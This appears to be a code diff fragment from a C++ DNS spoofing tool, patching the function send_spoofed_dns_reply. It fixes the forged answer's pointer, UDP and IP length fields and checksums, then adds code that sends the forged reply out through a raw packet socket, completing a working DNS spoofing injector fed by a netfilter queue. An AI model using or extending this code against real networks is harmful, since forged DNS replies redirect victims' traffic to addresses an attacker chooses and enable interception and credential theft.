@@ -397,7 +397,7 @@ void send_spoofed_dns_reply(char *packet)
     // move the pointer to the answer section
     char *dns_query = (char *)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
     // move the pointer to the answer section
-    char *dns_answer = (char *)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
+    // char *dns_answer = (char *)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
     // derive the question section
     while (*dns_query != 0)
     {
@@ -405,7 +405,7 @@ void send_spoofed_dns_reply(char *packet)
         dns_query++;
     }
     dns_query += 4; 
-    dns_answer = dns_query;
+    char *dns_answer = dns_query;
     struct answer_section *answer = (struct answer_section *)dns_answer;
     answer->name = htons(0xc00c);
     answer->type = htons(1);
@@ -421,9 +421,11 @@ void send_spoofed_dns_reply(char *packet)
     dns_answer += 4;
 
     // calculate total length  
-    int len = dbs_ansewr - packet;
-    cout << "len: " << len << endl;
-    ip_header->tot_len = htons(len);
+    int total_len = dns_answer - packet;
+    // cout << "Total length: " << total_len << endl;
+    udp_header->len = htons(total_len - ip_header->ihl * 4);
+    ip_header->tot_len = htons(total_len);
+
     // calculate udp checksum
     udp_header->check = 0;
     // pseudo header
@@ -439,11 +441,11 @@ void send_spoofed_dns_reply(char *packet)
     psh.dest_address = ip_header->daddr;
     psh.placeholder = 0;
     psh.protocol = IPPROTO_UDP;
-    psh.udp_length = htons(ntohs(ip_header->tot_len) - ip_header->ihl * 4);
-    int psize = sizeof(struct pseudo_header) + ntohs(ip_header->tot_len) - ip_header->ihl * 4;
+    psh.udp_length = htons(total_len - ip_header->ihl * 4);
+    int psize = sizeof(struct pseudo_header) + total_len - ip_header->ihl * 4;
     char *pseudogram = (char *)malloc(psize);
     memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
-    memcpy(pseudogram + sizeof(struct pseudo_header), udp_header, ntohs(ip_header->tot_len) - ip_header->ihl * 4);
+    memcpy(pseudogram + sizeof(struct pseudo_header), udp_header, total_len - ip_header->ihl * 4);
     // calculate the checksum
     unsigned short *udp_checksum = (unsigned short *)pseudogram;
     unsigned long sum = 0;
@@ -462,17 +464,35 @@ void send_spoofed_dns_reply(char *packet)
     ip_header->check = 0;
     unsigned short *ip_checksum = (unsigned short *)ip_header;
     sum = 0;
-    for (int i = 0; i < ip_header->ihl * 2; i++)
+    for (int i = 0; i < ip_header->ihl * 4 / 2; i++)
     {
         sum += ip_checksum[i];
-    }
+    } 
     while (sum >> 16)
     {
         sum = (sum & 0xFFFF) + (sum >> 16);
     }
     ip_header->check = ~sum;
 
+    // send the spoofed DNS reply
+    int sock_raw_fd;
+    if ((sock_raw_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP))) == -1)
+    {
+        cerr << "Error creating socket." << endl;
+    }
 
+    struct sockaddr_ll saddr_ll;
+    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
+    saddr_ll.sll_family = AF_PACKET;
+    saddr_ll.sll_protocol = htons(ETH_P_IP);
+    saddr_ll.sll_ifindex = ifindex;
+    if (sendto(sock_raw_fd, packet, total_len, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll)) < 0)
+    {
+        cerr << "Error sending packet." << endl;
+    }
+
+    close(sock_raw_fd);
+    
 
 }
 static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
